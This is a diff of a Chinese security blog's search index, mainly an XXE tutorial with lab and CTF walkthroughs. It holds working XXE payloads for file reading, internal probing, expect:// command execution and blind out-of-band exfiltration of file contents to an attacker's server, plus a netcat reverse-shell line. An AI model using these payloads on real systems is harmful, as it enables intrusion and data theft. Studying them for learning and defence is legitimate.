-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1942868">Vulnstack3</a></p>
-<p><a href="https://xz.aliyun.com/t/6988#toc-4">Vlunstack ATT&amp;CK实战系列——红队实战（三）Writeup</a></p>
-<p><a href="https://www.freebuf.com/articles/network/263069.html">记一次Vulnstack靶场内网渗透（四）</a></p>
-<p><a href="https://v0w.top/2020/03/14/mysql-getshell/#0x00-%E5%89%8D%E8%A8%80">mysql写shell的一点总结</a></p>
-<p><a href="https://www.freebuf.com/articles/network/263069.html">记一次Vulnstack靶场内网渗透（四）</a></p>
-<p><a href="https://blog.csdn.net/shang_0122/article/details/114820532">nginx正向和反向代理的区别</a>–<strong>本质上代理服务器还是那个代理服务器,如果替客户端干活就是正向代理,如果替服务端干活就是反向代理</strong></p>
-<p><a href="https://blog.csdn.net/weixin_45630258/article/details/124976564">Nginx 反向代理+负载均衡</a></p>
-<p><a href="https://blog.csdn.net/qq_43038960/article/details/125591755">代理、正向代理与反向代理</a></p>
-<p><a href="https://blog.csdn.net/tryheart/article/details/108245986">nmap 常用参数</a></p>
-<p><a href="https://wenku.baidu.com/view/ae5cca240722192e4536f64a.html">nmap命令使用详细解释</a></p>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">OpenSSL</a></p>
-<p><a href="https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz">Python3</a></p>
-<p><a href="https://github.com/lgandx/Responder">Responder</a></p>
-<p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
 ]]></content>
       <categories>
         <category>内网安全</category>
@@ -1412,114 +1958,6 @@
       <tags>
         <tag>渗透测试</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE&amp;XML</title>
-    <url>/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/</url>
-    <content><![CDATA[<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/XXE&XML.png" alt="XXE&amp;XML"></p>
-<span id="more"></span>
-<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML被设计为传输和存储数据，XML文档结构包括XML声明，DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML份里，是独立于软件和硬件的信息传输工具。</p>
-<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称XML  External Entity Injection，即<strong>xml外部实体注入</strong>漏洞，XXE漏洞发生在<strong>应用程序解析XML</strong>输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载而已外部文件，造成<strong>文件读取</strong>、命令执行、<strong>内网端口扫描</strong>、攻击内网网站等危害。</p>
-<h2 id="XML与HTML的主要差异"><a href="#XML与HTML的主要差异" class="headerlink" title="XML与HTML的主要差异"></a>XML与HTML的主要差异</h2><p>XML被设计为传输和存储数据，其焦点是数据内容</p>
-<p>HTML被设计用来显示数据，其焦点是数据外观</p>
-<p>XML旨在传输信息，而HTML旨在显示信息</p>
-<h2 id="玩法"><a href="#玩法" class="headerlink" title="玩法"></a>玩法</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;file:///d://test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这个<code>&lt;x&gt;&lt;/x&gt;</code>之间执行xxe实体</p>
-<h3 id="内网探针或攻击内网应用（出发漏洞地址）"><a href="#内网探针或攻击内网应用（出发漏洞地址）" class="headerlink" title="内网探针或攻击内网应用（出发漏洞地址）"></a>内网探针或攻击内网应用（出发漏洞地址）</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">rabbit</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.0.103:8081/index.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里的ip地址<code>192.168.0.103</code>是内网地址</p>
-<p>访问没有报错说明<code>index.php</code>文件存在，同时也说明8080端口开放</p>
-<p>对端口探针的话需要用其他协议</p>
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>该CASE是在expect扩展的PHP环境里执行系统命令</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="引入外部实体dtd"><a href="#引入外部实体dtd" class="headerlink" title="引入外部实体dtd"></a>引入外部实体dtd</h3><p>类似于远程文件包含 ，相当于是在自己的服务器上放上一个包含恶意xml语句的evil2.dtd文件，然后让服务器去访问，服务器便会执行dtd文件里的代码</p>
-<p>条件：对方服务器未禁止外部实体引用 </p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx.xxx:8081/evil2.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%fule;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">send</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="无回现-读文件"><a href="#无回现-读文件" class="headerlink" title="无回现-读文件"></a>无回现-读文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.xxx.xxx:8081/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">test.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span></span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEN &#x27;http://192.168.xxx.xxx:8081/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
-
-<p>过程：由于没有回显，所以我们读取的文件内容无法显示出来。这里我们先用file（经过base64加密）把文件内容读出来，然后再去访问远程地址（自己的服务器）上的一个dtd文件，这个dtd里访问自己服务器上的文件并且使用了file作为参数，完成这一代码后，我们便可读取自己服务器的日志文件，查看解密参数，便得到文件内容（还可以在自己服务器上写一个参数来接收这个值，<code>http://192.168.xxx.xxx:8081/xxe.php?data=%file;</code>这里data接收了文件内容）</p>
-<h3 id="协议-读文件（绕过）"><a href="#协议-读文件（绕过）" class="headerlink" title="协议-读文件（绕过）"></a>协议-读文件（绕过）</h3><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE-绕过</a></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="xxe-lab-php靶场登录框xml数据传输"><a href="#xxe-lab-php靶场登录框xml数据传输" class="headerlink" title="xxe-lab-php靶场登录框xml数据传输"></a>xxe-lab-php靶场登录框xml数据传输</h3><p>地址：<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p>
-<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>首先是用burp抓取数据包，然后右键<code>Send to Spider</code>，进行爬取</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp1.png" alt="xxe-lab-php-wp1"></p>
-<p>在<code>History</code>中可以看到爬取结果</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp2.png" alt="xxe-lab-php-wp2"></p>
-<p>然后对爬取内容搜索<code>xml</code>关键字</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp3.png" alt="xxe-lab-php-wp3"></p>
-<p>找到可以提交xml的页面</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp4.png" alt="xxe-lab-php-wp4"></p>
-<p>再将数据包发送到Repeater构造恶意xml代码进行攻击</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/xxe-lab-php-wp5.png" alt="xxe-lab-php-wp5"></p>
-<h3 id="CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改"><a href="#CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改" class="headerlink" title="CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改"></a>CTF-Jarvis-OJ-Web-XXE安全-数据请求格式更改</h3><p>地址：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
-<h4 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h4><p>先用burp抓包</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp1.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp1"></p>
-<p>再更改数据请求格式Content-Type的值为application/xml<br>然后POST提交下面的代码</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现flag可疑目录，flag应该在<code>/home/ctf/</code>下</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp2.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp2"></p>
-<p>于是修改payload，得到flag值</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8-wp3.png" alt="CTF-Jarvis-OJ-Web-XXE安全-wp3"></p>
-<h3 id="vulnhub-xxe-lab-1"><a href="#vulnhub-xxe-lab-1" class="headerlink" title="vulnhub-xxe lab:1"></a>vulnhub-xxe lab:1</h3><p>靶场下载地址：<a href="https://www.vulnhub.com/entry/xxe-lab-1,254/">XXE Lab: 1</a></p>
-<h4 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h4><p>先用nmap进行扫描</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp1.png" alt="vulnhub-xxe lab1-wp1"></p>
-<p>结果如下：</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp2.png" alt="vulnhub-xxe lab1-wp2"></p>
-<p>访问后没发现什么，然后用扫描器去扫，发现有robots.txt文件可以访问，并且得到两个有效信息，<code>/xxe/</code>目录和<code>/admin.php</code>文件</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp3.png" alt="vulnhub-xxe lab1-wp3"></p>
-<p>先访问<code>/xxe/</code>，登录抓包，发现发送的是xml格式数据</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp4.png" alt="vulnhub-xxe lab1-wp4"></p>
-<p>将数据包发往<code>Repeater</code>，构造攻击语句发包</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>显示<code>xxe.php</code>base64加密后内容</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp5.png" alt="vulnhub-xxe lab1-wp5"></p>
-<p>发送到burp的<code>Send to Decoder</code>去解密</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp6.png" alt="vulnhub-xxe lab1-wp6"></p>
-<p>解密得到，但并没有发现什么有用信息</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp7.png" alt="vulnhub-xxe lab1-wp7"></p>
-<p>想到之前还有一个<code>admin.php</code>文件，于是用payload去读取<code>admin.php</code>，进行相同操作，得到用户名和密码，密码是md5加密的</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">用户名：administhebest</span><br><span class="line">密码：<span class="symbol">admin@</span><span class="number">123</span></span><br></pre></td></tr></table></figure>
-
-<p>这里登录点要注意，是<code>admin.php</code>文件，我们应访问<code>/xxe/admin.php</code>，登进去后点击Flag</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp8.png" alt="vulnhub-xxe lab1-wp8"></p>
-<p>进去后跳转如下地址</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp9.png" alt="vulnhub-xxe lab1-wp9"></p>
-<p>说明有限制，我们接着用刚才的xxe漏洞去读这个文件<code>flagmeout.php</code></p>
-<p>注意该文件是在站点根部录下<code>./flagmeout.php</code></p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp10.png" alt="vulnhub-xxe lab1-wp10"></p>
-<p>解密后得到，这里是base32加密</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp11.png" alt="vulnhub-xxe lab1-wp11"></p>
-<p>网上查找base32解密后，得到一串base64加密，再解密后得到flag所在目录<code>/etc/flag.php</code></p>
-<p>再利用xxe漏洞去读，并解密</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp12.png" alt="vulnhub-xxe lab1-wp12"></p>
-<p>发现一串认不到的代码，从<code>$</code>符判断应该是php代码，我们找个php在线运行，把代码扔进去跑就行了，得到flag值</p>
-<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp13.png" alt="vulnhub-xxe lab1-wp13"></p>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>下载：<a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
-<p>文章：<a href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></p>
-<h2 id="修复与防御"><a href="#修复与防御" class="headerlink" title="修复与防御"></a>修复与防御</h2><p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/XXE%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E5%BE%A1.png" alt="XXE修复与防御"></p>
-]]></content>
-      <categories>
-        <category>小迪安全-Web渗透测试笔记</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>XXE</tag>
-        <tag>XML</tag>
       </tags>
   </entry>
   <entry>
@@ -2708,34 +3146,111 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
-    <title>网站权限后台漏洞获取</title>
-    <url>/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/</url>
-    <content><![CDATA[<p><img src="/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/.png" alt="png"></p>
-<p>具体有哪些权限需要掌握</p>
-<ul>
-<li><p>后台权限：（获得方式：爆破，注入猜解，弱口令等获取的账号密码配合登录）</p>
-<p>一般网站或后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件（如后台功能存在文件操作的话也可以操作文件数据）</p>
-</li>
-<li><p>网站权限：（获得方式：以上三种思路获取）</p>
-<p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备</p>
-</li>
-<li><p>数据库权限：<br>操作数据库的权限，数据库的增删改等，源码或配置文件泄露，也可能是网站权限（webshell）进行的数据库配置文件读取获得</p>
-</li>
-<li><p>接口权限：（邮件，短信，支付，第三方登录）</p>
-<p>后台或网站权限后的获取途径了后台（修改配置信息功能点），网站权限（查看配置文件获取）</p>
-</li>
-<li><p>系统权限</p>
-</li>
-<li><p>域控权限</p>
-</li>
-</ul>
+    <title>XXE&amp;XML</title>
+    <url>/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/</url>
+    <content><![CDATA[<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/XXE&XML.png" alt="XXE&amp;XML"></p>
+<span id="more"></span>
+<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML被设计为传输和存储数据，XML文档结构包括XML声明，DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML份里，是独立于软件和硬件的信息传输工具。</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称XML  External Entity Injection，即<strong>xml外部实体注入</strong>漏洞，XXE漏洞发生在<strong>应用程序解析XML</strong>输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载而已外部文件，造成<strong>文件读取</strong>、命令执行、<strong>内网端口扫描</strong>、攻击内网网站等危害。</p>
+<h2 id="XML与HTML的主要差异"><a href="#XML与HTML的主要差异" class="headerlink" title="XML与HTML的主要差异"></a>XML与HTML的主要差异</h2><p>XML被设计为传输和存储数据，其焦点是数据内容</p>
+<p>HTML被设计用来显示数据，其焦点是数据外观</p>
+<p>XML旨在传输信息，而HTML旨在显示信息</p>
+<h2 id="玩法"><a href="#玩法" class="headerlink" title="玩法"></a>玩法</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;file:///d://test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个<code>&lt;x&gt;&lt;/x&gt;</code>之间执行xxe实体</p>
+<h3 id="内网探针或攻击内网应用（出发漏洞地址）"><a href="#内网探针或攻击内网应用（出发漏洞地址）" class="headerlink" title="内网探针或攻击内网应用（出发漏洞地址）"></a>内网探针或攻击内网应用（出发漏洞地址）</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">rabbit</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.0.103:8081/index.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的ip地址<code>192.168.0.103</code>是内网地址</p>
+<p>访问没有报错说明<code>index.php</code>文件存在，同时也说明8080端口开放</p>
+<p>对端口探针的话需要用其他协议</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>该CASE是在expect扩展的PHP环境里执行系统命令</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="引入外部实体dtd"><a href="#引入外部实体dtd" class="headerlink" title="引入外部实体dtd"></a>引入外部实体dtd</h3><p>类似于远程文件包含 ，相当于是在自己的服务器上放上一个包含恶意xml语句的evil2.dtd文件，然后让服务器去访问，服务器便会执行dtd文件里的代码</p>
+<p>条件：对方服务器未禁止外部实体引用 </p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx.xxx:8081/evil2.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%fule;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">send</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="无回现-读文件"><a href="#无回现-读文件" class="headerlink" title="无回现-读文件"></a>无回现-读文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.xxx.xxx:8081/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">test.dtd:</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span></span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEN &#x27;http://192.168.xxx.xxx:8081/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
+
+<p>过程：由于没有回显，所以我们读取的文件内容无法显示出来。这里我们先用file（经过base64加密）把文件内容读出来，然后再去访问远程地址（自己的服务器）上的一个dtd文件，这个dtd里访问自己服务器上的文件并且使用了file作为参数，完成这一代码后，我们便可读取自己服务器的日志文件，查看解密参数，便得到文件内容（还可以在自己服务器上写一个参数来接收这个值，<code>http://192.168.xxx.xxx:8081/xxe.php?data=%file;</code>这里data接收了文件内容）</p>
